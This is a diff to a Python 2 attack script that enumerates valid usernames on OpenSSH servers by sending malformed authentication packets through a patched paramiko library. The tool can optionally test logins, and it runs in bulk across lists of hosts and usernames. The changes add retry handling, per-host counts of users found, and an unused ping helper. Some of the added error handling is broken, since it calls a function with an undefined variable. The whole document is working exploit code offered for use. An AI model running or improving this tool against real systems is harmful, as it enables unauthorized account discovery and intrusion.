@@ -31,11 +31,13 @@ import sys
 import json
 import os
 import time
+from socket import error as socket_error
 from datetime import datetime
 startTime = datetime.now()
 authcheck = False
 
 dirName = 'SSHLoginData'
+
  
 if not os.path.exists(dirName):
     os.mkdir(dirName)
@@ -66,7 +68,16 @@ def malform_packet(*args, **kwargs):
     #return old add_boolean function so start_client will work again
     paramiko.message.Message.add_boolean = old_add_boolean
     return result
- 
+
+from platform   import system as system_name  # Returns the system/OS name
+from subprocess import call   as system_call  # Execute a shell command
+
+def ping(host):
+    #Currently not being used
+    param = '-n' if system_name().lower()=='windows' else '-c'
+    command = ['ping', param, '1', host]
+    return system_call(command) == 0
+    
 # create function to perform authentication with malformed packet and desired username
 def checkUsername(runArray, tried=0):
     
@@ -93,11 +104,14 @@ def checkUsername(runArray, tried=0):
         transport.auth_publickey(username, paramiko.RSAKey.generate(1024))
     except BadUsername:
         return (False)
-    # except paramiko.ssh_exception.SSHException:
-        # return checkUsername(runArray)
+    except socket.error:
+        print '[-] Connecting to host: ' + host + ' failed. SSH server is likely blocking us now.'
+        # sys.exit(1)
+        return False
     except paramiko.ssh_exception.AuthenticationException:
         out = False
         global authcheck
+        global usersfound
         if authcheck == True:
             out = sshAuth(host,port,username)
             paramiko.auth_handler.AuthHandler._handler_table[paramiko.common.MSG_SERVICE_ACCEPT] = malform_packet
@@ -105,13 +119,16 @@ def checkUsername(runArray, tried=0):
             if out == True:
                 print "[+] " + str(host) + ':' + str(port) + ' - ' + username + " - Valid user found and username successfully authenticated."
                 saveFile(username, host, port, out)
+                return True
             else:
                 print "[+] " + str(host) + ':' + str(port) + ' - ' + username + " - Valid user found."
                 saveFile(username, host, port, out)
+                return True
         else:
-            saveFile(username, host, port, out)
             print "[+] " + str(host) + ':' + str(port) + ' - ' + username + " - Valid user found."
-        return (True)
+            saveFile(username, host, port, out)
+            return True
+        return True
     #Successful auth(?)
     raise Exception("There was an error. Is this the correct version of OpenSSH?")
 
@@ -156,6 +173,7 @@ def sshAuth(host,port,username, tried=0):
                 print '[-] Failed to negotiate SSH transport. Trying next user.' 
                 return False
 
+
 def saveFile(username, host, port, out):
     outputFile = open("SSHLoginData/" + str(host) + ".txt", "a")
     if out == True:
@@ -165,7 +183,7 @@ def saveFile(username, host, port, out):
     outputFile.close()
 
 def trySocket(host, port, tried=0):
-    print "Testing host: " + host + ":" + str(port)
+    print "\nTesting host: " + host + ":" + str(port)
     sock = socket.socket()
     try:
         sock.settimeout(10)
@@ -175,6 +193,14 @@ def trySocket(host, port, tried=0):
         print '[-] Connecting to host: ' + host + ' failed. Please check the specified host and port.'
         # sys.exit(1)
         return False, False
+    except socket_error as socket_err:
+        if tried < 4:
+            tried += 1
+            print '[-] Getting socket errors. Waiting 15 seconds to try again.' 
+            time.sleep(15)
+            return sshAuth(host,port,username, tried)
+        else:
+            return False, False
     except paramiko.ssh_exception.SSHException:
         # server was likely flooded, retry up to 3 times
         if tried < 4:
@@ -189,6 +215,7 @@ def trySocket(host, port, tried=0):
     if args.testcreds:
         host, port, authcheck = checkauthtype(host, port)
     return host, port
+
   
 # assign functions to respective handlers
 
@@ -223,10 +250,11 @@ group.add_argument('--userList', type=str, choices=['small', 'medium', 'large'],
 group.add_argument('--custuserList', type=str, help="A custom list of usernames (one per line) to enumerate through")
 
 args = arg_parser.parse_args()
- 
-def run_line():
-    try:
 
+
+def run_line():
+    usersfound = 0
+    try:
         if args.username: 
             if args.hostnameList:
                 try:
@@ -248,7 +276,8 @@ def run_line():
 
                 if results[0] == False:
                     print "[-] Username " + args.username + " does not exist on " + str(args.hostname)
-                print "Running time - Host: " + host + " done in " + str(datetime.now() - startTime) + "\n"
+                print "\n" + "[+] Running time - Host: " + host + " done in " + str(datetime.now() - startTime)
+                print "[+] " + str(sum(results)) + " users found" + "\n"
                 
             elif args.hostname:
                 runArray = []
@@ -260,7 +289,8 @@ def run_line():
                 results = pool.map(checkUsername, runArray)
                 if results[0] == False:
                     print "[-] Username " + args.username + " does not exist on " + str(args.hostname)
-                print "Running time - Host: " + args.hostname + " done in " + str(datetime.now() - startTime) + "\n"
+                print "\n" + "[+] Running time - Host: " + args.hostname + " done in " + str(datetime.now() - startTime)
+                print "[+] " + str(sum(results)) + " users found" + "\n"
                 
         elif args.custuserList: #username list passed in
             if args.hostname:
@@ -281,7 +311,8 @@ def run_line():
                 f.close()
                 pool = multiprocessing.Pool(args.threads)
                 results = pool.map(checkUsername, runArray)
-                print "Running time - Host: " + args.hostname + " done in " + str(datetime.now() - startTime) + "\n"
+                print "\n" + "[+] Running time - Host: " + args.hostname + " done in " + str(datetime.now() - startTime)
+                print "[+] " + str(sum(results)) + " users found" + "\n"
             elif args.hostnameList:
                 try:
                     f1 = open(args.hostnameList)
@@ -307,7 +338,8 @@ def run_line():
                             f2.close()
                             pool = multiprocessing.Pool(args.threads)
                             results = pool.map(checkUsername, runArray)
-                            print "Running time - Host: " + host + " done in " + str(datetime.now() - startTime) + "\n"
+                            print "\n" + "[+] Running time - Host: " + host + " done in " + str(datetime.now() - startTime)
+                            print "[+] " + str(sum(results)) + " users found" + "\n"
                         else:
                             continue
                     else:
@@ -333,7 +365,8 @@ def run_line():
                 f.close()
                 pool = multiprocessing.Pool(args.threads)
                 results = pool.map(checkUsername, runArray)
-                print "Running time - Host: " + args.hostname + " done in " + str(datetime.now() - startTime) + "\n"
+                print "\n" + "[+] Running time - Host: " + args.hostname + " done in " + str(datetime.now() - startTime)
+                print "[+] " + str(sum(results)) + " users found" + "\n"
                 
             elif args.hostnameList:
                 try:
@@ -365,7 +398,8 @@ def run_line():
                             f2.close()
                             pool = multiprocessing.Pool(args.threads)
                             results = pool.map(checkUsername, runArray)
-                            print "Running time - Host: " + host + " done in " + str(datetime.now() - startTime) + "\n"
+                            print "\n" + "[+] Running time - Host: " + host + " done in " + str(datetime.now() - startTime)
+                            print "[+] " + str(sum(results)) + " users found" + "\n"
                         else:
                             continue
                     else:
@@ -373,7 +407,7 @@ def run_line():
         else: # no usernames passed in
             print "[-] No usernames provided to check"
             sys.exit(4)
-            
+        
     except Exception as e:
         print("Error: " + str(e))
         raise
